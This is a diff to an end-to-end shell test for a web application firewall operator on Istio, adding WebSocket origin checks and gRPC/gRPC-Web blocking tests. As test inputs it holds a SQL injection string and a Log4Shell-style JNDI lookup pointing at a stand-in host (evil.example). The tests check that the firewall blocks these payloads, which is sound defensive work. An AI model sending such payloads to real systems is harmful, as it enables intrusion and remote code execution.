@@ -11,7 +11,10 @@
 # the protected route and pass on the other, a body attack is held back
 # with its headers, a stopped engine fails closed, detect mode logs
 # without blocking, and unprotecting or uninstalling leaves the user's
-# objects as they were. Then Istio's own API (#281): an ingress gateway
+# objects as they were. WebSocket handshakes and gRPC calls through the
+# Gateways (#369): an allowed handshake upgrades, one from another origin or
+# with an attack gets 403; a gRPC (and gRPC-Web) call with an attack in its
+# metadata gets HTTP 200 and the engine's gRPC status. Then Istio's own API (#281): an ingress gateway
 # from Istio's gateway chart, an Istio Gateway and a protected
 # VirtualService: the Pod webhook injects the engine into the gateway's
 # pods, attacks on the VirtualService are blocked, another passes, and
@@ -44,6 +47,11 @@ VS_PORT=$((CUSTOM_PORT + 2))
 KUBECTL=(kubectl --context "kind-$CLUSTER")
 HELM=(helm --kube-context "kind-$CLUSTER")
 SQLI='/?id=1%27%20OR%20%271%27%3D%271'
+# The origin the policy allows WebSockets from, and another (#369).
+WS_ORIGIN=https://app.e2e.example.com
+WS_EVIL=https://evil.example
+WS_IMAGE=inkwall-wsecho:e2e
+GRPC_ATTACK="x-api-key=\${jndi:ldap://evil.example/a}"
 
 # eventually retries for up to 3 minutes.
 EVENTUALLY_TRIES=360
@@ -104,6 +112,17 @@ if ! "${KUBECTL[@]}" -n "$ISTIO_NS" get deployment/istiod >/dev/null 2>&1; then
 fi
 ok "Istio installed"
 
+# The WebSocket echo server (hack/wsecho), built here: test only, never
+# released; and the clients.
+mkdir -p "$work/wsimg"
+CGO_ENABLED=0 go build -trimpath -o "$work/wsimg/wsecho" ./hack/wsecho
+printf 'FROM gcr.io/distroless/static-debian12:nonroot\nCOPY wsecho /wsecho\nENTRYPOINT ["/wsecho"]\n' >"$work/wsimg/Dockerfile"
+docker build -q -t "$WS_IMAGE" "$work/wsimg" >/dev/null
+kind load docker-image "$WS_IMAGE" --name "$CLUSTER" >/dev/null
+go build -o "$work/grpchealth" ./hack/grpchealth
+go build -o "$work/wsecho" ./hack/wsecho
+printf '\0\0\0\0\0' >"$work/grpc-empty"
+
 # The user's objects: an app, a ConfigMap customizing a Gateway's pods
 # (a label), a Gateway naming it, one naming none, the protected route on
 # both and an unprotected one.
@@ -128,6 +147,50 @@ kind: Service
 metadata: {name: app, namespace: $NS}
 spec:
   selector: {app: istio-e2e}
+  ports: [{name: http, port: 8080}]
+---
+# A gRPC service: grpc.health.v1.Health, over h2c.
+apiVersion: apps/v1
+kind: Deployment
+metadata: {name: grpc, namespace: $NS}
+spec:
+  selector: {matchLabels: {app: istio-e2e-grpc}}
+  template:
+    metadata: {labels: {app: istio-e2e-grpc}}
+    spec:
+      containers:
+        - name: grpc
+          image: registry.k8s.io/e2e-test-images/agnhost:$AGNHOST_VERSION
+          args: ["grpc-health-checking", "--port", "5000"]
+---
+apiVersion: v1
+kind: Service
+metadata: {name: grpc, namespace: $NS}
+spec:
+  selector: {app: istio-e2e-grpc}
+  # Istio's protocol selection: HTTP/2 to the backend.
+  ports: [{name: grpc, port: 5000, appProtocol: grpc}]
+---
+# A WebSocket echo server.
+apiVersion: apps/v1
+kind: Deployment
+metadata: {name: wsecho, namespace: $NS}
+spec:
+  selector: {matchLabels: {app: istio-e2e-wsecho}}
+  template:
+    metadata: {labels: {app: istio-e2e-wsecho}}
+    spec:
+      containers:
+        - name: wsecho
+          image: $WS_IMAGE
+          imagePullPolicy: Never
+          args: ["-listen", ":8080"]
+---
+apiVersion: v1
+kind: Service
+metadata: {name: wsecho, namespace: $NS}
+spec:
+  selector: {app: istio-e2e-wsecho}
   ports: [{name: http, port: 8080}]
 ---
 apiVersion: v1
@@ -173,6 +236,12 @@ spec:
   rules:
     - name: web
       backendRefs: [{name: app, port: 8080}]
+    - name: grpc
+      matches: [{path: {type: PathPrefix, value: /grpc.health.v1.Health/}}]
+      backendRefs: [{name: grpc, port: 5000}]
+    - name: ws
+      matches: [{path: {type: PathPrefix, value: /ws}}]
+      backendRefs: [{name: wsecho, port: 8080}]
 ---
 apiVersion: gateway.networking.k8s.io/v1
 kind: HTTPRoute
@@ -183,7 +252,9 @@ spec:
   rules:
     - backendRefs: [{name: app, port: 8080}]
 YAML
-"${KUBECTL[@]}" -n "$NS" rollout status deployment/app --timeout=120s >/dev/null
+for d in app grpc wsecho; do
+  "${KUBECTL[@]}" -n "$NS" rollout status "deployment/$d" --timeout=120s >/dev/null
+done
 
 # What the user wrote, to compare with after the operator is gone.
 user_objects() {
@@ -254,6 +325,8 @@ spec:
   # CRS on the 48 KB form field below, on a CI runner, can pass the
   # default 250 ms. Envoy waits 500 ms longer than this.
   timeout: 1s
+  webSocket:
+    allowedOrigins: ["$WS_ORIGIN"]
 ${2:-}
 YAML
 }
@@ -281,11 +354,75 @@ leak_replaced() {
     ! curl -s -H "Host: $HOST" -H "$LEAK" "http://127.0.0.1:$port/leak" | grep -qF 'SQL syntax' || return 1
   done
 }
+# engine_logs SELECTOR: the engine log of every pod SELECTOR selects, each
+# read on its own: `kubectl logs -l` reads at most five pods (#508).
+engine_logs() {
+  local pod
+  for pod in $("${KUBECTL[@]}" -n "$NS" get pods -l "$1" -o name); do
+    "${KUBECTL[@]}" -n "$NS" logs "$pod" -c inkwall-engine --tail=-1 2>/dev/null || true
+  done
+}
 # logged_response SELECTOR ACTION PATH: an engine of the pods SELECTOR
 # selects logged a response event for PATH.
 logged_response() {
-  "${KUBECTL[@]}" -n "$NS" logs -l "$1" -c inkwall-engine --tail=-1 |
+  engine_logs "$1" |
     grep '"security event"' | grep '"phase":"response"' | grep "\"action\":\"$2\"" | grep "\"path\":\"$3\"" >/dev/null
+}
+# leak_logged SELECTOR PORT HOST: a leaking response on a fresh path passes
+# (200), and an engine of the pods SELECTOR selects logs it as a Detect-mode
+# response event within 10 s. Each try sends a new request (#508): Envoy can
+# stream responses (observability mode) before the engines apply the Detect
+# bundle, and an engine still in Block mode logs that request as a deny.
+leak_logged() {
+  local path=/leak-$RANDOM$RANDOM
+  [[ $(code "$2" "$3" "$path" -H "$LEAK") == 200 ]] || return 1
+  for _ in $(seq 20); do
+    logged_response "$1" log "$path" && return 0
+    sleep 0.5
+  done
+  return 1
+}
+# grpc_are CODE [KEY=VALUE...]: a gRPC call (grpc.health.v1.Health/Check)
+# with that metadata ends with that status code, through both Gateways.
+grpc_are() {
+  local want=$1 md=() port
+  shift
+  for kv in "$@"; do md+=(-metadata "$kv"); done
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
+    [[ $("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port") == "$want" ]] || return 1
+  done
+}
+# grpc_denied_by_engine [KEY=VALUE...]: ... is PermissionDenied with the
+# engine's grpc-message, which names the request ID (a denial Envoy turned
+# into a gRPC status itself would not).
+grpc_denied_by_engine() {
+  local md=() port out
+  for kv in "$@"; do md+=(-metadata "$kv"); done
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
+    out=$("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port" 2>&1) || return 1
+    [[ $out == *"grpchealth: Forbidden (request ID "*")"*PermissionDenied ]] || return 1
+  done
+}
+# grpc_web_denied: a gRPC-Web call (curl, HTTP/1.1) with an attack in its
+# metadata gets HTTP 200 and grpc-status 7, through both Gateways.
+grpc_web_denied() {
+  local port got
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
+    got=$(curl -s -o /dev/null -D - -H "Host: $HOST" -H 'Content-Type: application/grpc-web+proto' -H 'X-Grpc-Web: 1' \
+      -H "X-Api-Key: \${jndi:ldap://evil.example/a}" --data-binary "@$work/grpc-empty" \
+      "http://127.0.0.1:$port/grpc.health.v1.Health/Check" |
+      tr -d '\r' | awk 'NR == 1 { code = $2 } tolower($1) == "grpc-status:" { grpc = $2 } END { print code, grpc }' || true)
+    [[ $got == "200 7" ]] || return 1
+  done
+}
+# ws_are RESULT PATH [ORIGIN]: a WebSocket handshake from ORIGIN (default:
+# the allowed one) ends with RESULT through both Gateways: "upgraded" (101,
+# and a message echoed) or the status it got instead.
+ws_are() {
+  local want=$1 path=$2 origin=${3:-$WS_ORIGIN} port
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
+    [[ $("$work/wsecho" -host "$HOST" -origin "$origin" "127.0.0.1:$port$path") == "$want" ]] || return 1
+  done
 }
 has_sidecar() {
   "${KUBECTL[@]}" -n "$NS" get configmap custom-params -o jsonpath='{.data.deployment}' | grep 'name: inkwall-engine' >/dev/null
@@ -308,7 +445,7 @@ reached_app() { "${KUBECTL[@]}" -n "$NS" logs deployment/app --since=10m | grep 
 # logged PATH: an engine in the Gateways' pods logged a detect-mode event
 # for PATH.
 logged() {
-  "${KUBECTL[@]}" -n "$NS" logs -l gateway.istio.io/managed=istio.io-gateway-controller -c inkwall-engine --tail=-1 |
+  engine_logs gateway.istio.io/managed=istio.io-gateway-controller |
     grep '"security event"' | grep '"action":"log"' | grep "\"path\":\"$1\"" >/dev/null
 }
 no_wiring() {
@@ -322,6 +459,9 @@ done
 forward_all
 eventually "the Gateways serve the app" both_are 200 /
 check "no policy yet: the attack passes" both_are 200 "$SQLI"
+eventually "the Gateways serve the gRPC service" grpc_are OK
+eventually "the Gateways upgrade a WebSocket" ws_are upgraded /ws
+check "no policy yet: any origin upgrades" ws_are upgraded /ws "$WS_EVIL"
 
 echo "== block mode"
 policy
@@ -338,6 +478,12 @@ eventually "the attack is blocked through both Gateways" both_are 403 "$SQLI"
 check "benign traffic passes" both_are 200 /products/42
 check "the unprotected route lets the attack through" open_are 200 "$SQLI"
 check "the user's pod label is kept" labelled
+check "a gRPC call passes" grpc_are OK
+check "a gRPC call with an attack in its metadata gets the engine's gRPC status" grpc_denied_by_engine "$GRPC_ATTACK"
+check "a gRPC-Web call with an attack gets HTTP 200 and grpc-status 7" grpc_web_denied
+check "a WebSocket from the allowed origin upgrades and echoes" ws_are upgraded /ws
+check "a WebSocket from another origin gets 403, no upgrade" ws_are 403 /ws "$WS_EVIL"
+check "a WebSocket with an attack in its URL gets 403" ws_are 403 "/ws?room=1%27%20OR%20%271%27%3D%271"
 {
   printf x=
   head -c 48000 /dev/zero | tr '\0' a
@@ -438,7 +584,7 @@ policy Detect "$RESPONSES"
 eventually "the EnvoyFilters stream the responses in detect mode" responses_sent STREAMED
 forward_all
 eventually "detect mode: the leak passes" leak_is 200 "$CUSTOM_PORT" "$HOST"
-eventually "and the engines log it" logged_response gateway.istio.io/managed=istio.io-gateway-controller log /leak
+eventually "and the engines log it" leak_logged gateway.istio.io/managed=istio.io-gateway-controller "$CUSTOM_PORT" "$HOST"
 
 echo "== unprotected"
 "${KUBECTL[@]}" -n "$NS" delete wafpolicy shared --timeout=60s >/dev/null
@@ -572,7 +718,7 @@ check "the unprotected VirtualService lets the leak through" leak_is 200 "$VS_PO
 eventually "the ingress gateway's engine logs it as a response deny" logged_response istio=ingressgateway deny /leak
 vs_policy Detect "$RESPONSES"
 eventually "VirtualService, detect mode: the leak passes" leak_is 200 "$VS_PORT" "$VS_HOST"
-eventually "and the engine logs it" logged_response istio=ingressgateway log /leak
+eventually "and the engine logs it" leak_logged istio=ingressgateway "$VS_PORT" "$VS_HOST"
 vs_policy
 "${KUBECTL[@]}" -n "$NS" delete wafpolicy vs --timeout=60s >/dev/null
 eventually "unprotected: the EnvoyFilter is gone" no_vs_filter
